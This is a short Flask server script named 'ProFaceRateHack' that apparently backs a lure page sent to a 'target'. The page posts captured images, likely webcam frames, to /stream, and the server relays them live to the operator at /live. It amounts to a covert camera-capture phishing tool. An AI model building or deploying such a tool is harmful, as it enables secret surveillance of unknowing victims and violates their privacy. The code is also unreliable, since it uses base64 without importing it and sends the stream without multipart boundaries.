from flask import Flask, render_template, request, Response
from PIL import Image
import io
import threading
import time

app = Flask(__name__, static_folder='../static', template_folder='../templates')

latest_frame = None
lock = threading.Lock()

@app.route('/target')
def target():
    return render_template('index.html')

@app.route('/stream', methods=['POST'])
def stream():
    global latest_frame
    try:
        img_b64 = request.json['image'].split(',')[1]
        img_data = base64.b64decode(img_b64)
        img = Image.open(io.BytesIO(img_data)).convert('RGB')
        img = img.resize((640, 480))
        buffered = io.BytesIO()
        img.save(buffered, format="JPEG", quality=70)
        with lock:
            latest_frame = buffered.getvalue()  # KIRIM RAW JPEG!
    except Exception as e:
        print("Error:", e)
    return {"status": "ok"}

@app.route('/live')
def live():
    def gen():
        while True:
            with lock:
                if latest_frame:
                    yield latest_frame  # KIRIM RAW JPEG!
            time.sleep(0.03)
    return Response(gen(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/')
def home():
    return "<h2>ProFaceRateHack ACTIVE</h2><a href='/target'>Target Link</a>"
